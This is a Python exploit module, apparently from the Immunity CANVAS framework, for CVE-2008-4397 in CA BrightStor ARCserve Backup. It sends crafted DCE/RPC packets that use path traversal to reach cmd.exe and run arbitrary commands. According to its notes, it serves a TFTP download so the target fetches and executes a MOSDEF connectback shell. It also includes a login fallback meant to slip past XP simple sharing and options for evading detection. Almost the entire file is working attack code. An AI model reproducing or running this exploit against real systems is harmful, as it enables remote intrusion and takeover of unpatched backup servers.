#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')
import os
import getopt
import canvasengine

from exploitutils import *
from tcpexploit import tcpexploit
from libs.canvasos import *
from ExploitTypes.CommandLineExecuter import CommandExploit
from msrpcexploit import msrpcexploit
from MOSDEF import mosdef
import libs.newsmb.libdcerpc as libdcerpc

# GUI info
NAME='brightstor_cmdexec'
DESCRIPTION='CA BrightStor ARCserve Backup Arbitrary Command Execution'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Computer Associates"
DOCUMENTATION['References']='http://archives.neohapsis.com/archives/bugtraq/2008-10/0090.html'
DOCUMENTATION['Platforms Tested']=''
DOCUMENTATION['Notes']='This exploit will start a TFTP server (which is why it requires root) and have the remote side download and execute a MOSDEF connectback'
DOCUMENTATION['CVE Name'] = 'CVE-2008-4397'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4397'
DOCUMENTATION['Date public']='10/11/2008'
DOCUMENTATION['Repeatability']='Infinite'


VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003']

CHANGELOG="""
"""

NOTES="""
CA BrightStor ARCserv Backup r11.5 ...

Needs to be run as root in order to start a tftp server.

Tested on:
Windows XP SP3 English with CA BrightStor ARCserv Backup r11.5

Keep in mind, BrightStor won't install on "Home" versions of XP.
"""

targets={
    0: ['CA BrightStor ARCserve Backup r11.1 - 12.0'],
}


class theexploit(tcpexploit, CommandExploit):

    def __init__(self):
        tcpexploit.__init__(self)
        CommandExploit.__init__(self)
        self.name         = NAME
        self.setInfo(DESCRIPTION)
        self.version      = 0
        self.sleeptime    = 4
        self.computername = ""
        self.port         = 6504

        # msrpc stuff
        self.response         = 1
        self.forceauth        = 0
        self.UUID             = u'506b1890-14c8-11d1-bbc3-00805fa6962e'
        self.uuidversion      = u'1.0'
        self.targetfunction   = 0x156
        self.getcontexthandle = None
        self.object           = ""

        #??
        self.listen_port=5555

        # CommandExploit params
        self.max_command_length=60
        self.capabilities=["tftp"]

    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def buildConnectionList(self):
        host=self.host
        connectionList=['ncacn_ip_tcp:%s[%d]'%(host,self.port)]
        self.connectionList=connectionList
        return self.connectionList

    def s_dce_string(self,mystr): #put this into msrpc.py some day
        ret=''
        if len(mystr)==0 or mystr[-1]!='\0':
            mystr+='\0' #add null byte
        size=len(mystr)
        ret+=struct.pack('<LLL',size,0,size)
        ret+=mystr
        while (len(ret)%4)!=0:
            ret+='\0' #padding
        return ret

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def buildDcePacket(self,cmd):

        packet = ""

        # NetBios computer name, blank works fine
        packet += self.s_dce_string(self.computername) 
    
        # Command to be executed -> Path transversal bug
        packet += self.s_dce_string(cmd)

        # Other foo args
        packet += self.s_dce_string("B" * 0x20)
        packet += self.s_dce_string("")

        packet += "\xce\x00\x00\x00" + "\xce\x00\x00\x00"

        #a little bit of XML footer
        packet += "\xff\xfe\x3c\x00\x3f\x00\x78\x00\x6d\x00\x6c\x00\x20\x00\x76\x00\x65\x00\x72\x00\x73\x00\x69\x00\x6f\x00"
        packet += "\x6e\x00\x3d\x00\x22\x00\x31\x00\x2e\x00\x30\x00\x22\x00\x3f\x00\x3e\x00\x0d\x00\x0a\x00\x3c\x00\x52\x00\x45\x00\x50\x00\x4f\x00\x52\x00\x54\x00\x3e\x00\x0d\x00\x0a\x00\x20\x00\x3c\x00\x48\x00\x45\x00\x41\x00\x44\x00\x45\x00\x52\x00\x20\x00\x44\x00\x61\x00\x74\x00\x65\x00\x3d\x00\x22\x00\x79\x00\x65\x00\x73\x00\x22\x00\x3e\x00\x0d\x00\x0a\x00\x3c\x00\x54\x00\x49\x00\x54\x00\x4c\x00\x45\x00\x3e\x00\xcf\x6b\xe5\x65\x07\x59\xfd\x4e\xb6\x72\x01\x60\xa5\x62\x68\x88\x3c\x00\x2f\x00\x54\x00\x49\x00\x54\x00\x4c\x00\x45\x00\x3e\x00\x0d\x00\x0a\x00\x3c\x00\x44\x00\x45\x00\x53\x00\x43\x00\x52\x00\x3e\x00\x28\x57\x4d\x52\x20\x00\x32\x00\x34\x00\x20\x00\x0f\x5c\xf6\x65\x85\x51\x8c\x5b\x10\x62\x84"
        packet += "\x76\x07\x59\xfd\x4e\x5c\x4f\x00\x00\x00\x00\x00\x00\xde\x77\x00\x00"

        return packet

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def connect(self):
        # connect DCE pipe
        connectionList =  self.buildConnectionList()
        devlog('msrpcexploit::connect', "connectionList: %s" % connectionList)
        res = None

        auth_type = libdcerpc.RPC_C_AUTHN_NONE if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_WINNT
        auth_level = libdcerpc.RPC_C_AUTHN_LEVEL_DEFAULT if self.covertness < 2 else libdcerpc.RPC_C_AUTHN_LEVEL_PKT_PRIVACY

        if self.covertness >= 2:
            self.log("DCERPC crypto enabled, set covertness to 1 and try again if exploit fails!")

        frag_level = None
        if self.covertness >= 5 and self.covertness < 11:
            self.log('Crypto + moderate SMB fragmentation')
            frag_level = 1
        elif self.covertness == 11:
            self.log('Crypto + MAX fragmentation')
            frag_level = 2
        
        for binding in connectionList:
            res = None
            try:
                self.myDCE = libdcerpc.DCERPC(binding, getsock=self, username=self.user, password=self.password,
                                              frag_level=frag_level)
                res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
            except libdcerpc.DCERPCException, msg:
                self.log(msg)
            if res:
                break

        if not res:
            self.log("Trying to connect with user \"bob\" to bypass XP simple sharing")
            for i in connectionList:
                try:
                    self.myDCE = libdcerpc.DCERPC(i, getsock=self, username=u"bob", password=self.password, frag_level=frag_level)
                    res = self.myDCE.bind(self.UUID, self.uuidversion, auth_type=auth_type, auth_level=auth_level)
                except libdcerpc.DCERPCException, msg:
                    self.log(msg)
                if res:
                    break
                
        if not res:
            self.log("Could not connect to remote server - service is not running or the host is firewalled.")
            self.result_error=self.ERR_COULD_NOT_CONNECT
            return 0
         
        self.log("MSRPC exploit attacking target!")
        return 1


    def run_command(self, cmd, blind=0):
        """
        Runs one command (blindly?) using the RPC function.
        There's a length limit here somewhere. What is it?
        """
        pkt = self.buildDcePacket("../../../../../../../..//windows//system32//cmd.exe /c \"" + cmd + "\" & rem ")
        if blind:
            response = False
        else:
            response = True 

        ret = self.myDCE.call(self.targetfunction, pkt, response=response)
        if not blind:
            self.log("Result of command: %s"%ret)
        return ret

    def test(self):
        self.getargs()
        #TODO really automate this
        newos=canvasos()
        newos.arch="X86"
        newos.base="Windows"
        newos.version="XP"
        self.target_os=newos
        self.version=1

        self.log("Connecting to %s:%d" % (self.host,self.port))
        try:
            ret=self.connect()
            if not ret:
                self.log("Could not connect to BrightStor!")
                return 0
 
            pkt = self.run_command("echo 1")
            p = pkt[0]
            if p.rawdata[0:4] == "\x0C\x00\x00\x00":
                self.log("BrightStor ARCserve Backup is not vulnerable")
                return 0
            return 1
        except:
            self.log("Exception when connecting")
            return 0
        #never reached
   
        return 0
    
    def run(self):
        """
        Returns:
        1 (on sucessful callback), 0 (on failure)
        """
        self.getargs()

        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        ret=self.test()
        if self.version==0:
            #In order to correctly set up our attack string we first need to 
            #determine the OS we are targeting as much as possible
            ret=self.test()
            if not ret:
                self.log("Testing didn't find target as vulnerable")
                return 0
            
        self.log("Testing did find target as vulnerable!")
        try:
            ret=self.connect()
            if not ret:
                self.log("Could not connect!")
                self.setProgress(-1)
                return 0

            if self.getcontexthandle:
                ret=self.getcontexthandle()
                if not ret:
                    self.log("Could not get a context handle")
                    self.result_error=self.ERR_FAILED
                    self.setProgress(-1)
                    return 0
            #next we upload a MOSDEF executable and execute it
            self.upload_and_execute()
        except self.error, msg:
            self.result_error=self.ERR_FAILED
            self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
            self.log("Failed reason: %s" % str(msg))
            self.setProgress(-1)
            return 0
        if self.upload_listener:
            try:
                self.upload_listener.close()
            except:
                #may be already closed!
                pass 
        ret=0
        if self.ISucceeded():
            self.log("Got a new MOSDEF up and running!")
            ret=1

        return ret



if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app=theexploit()

    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
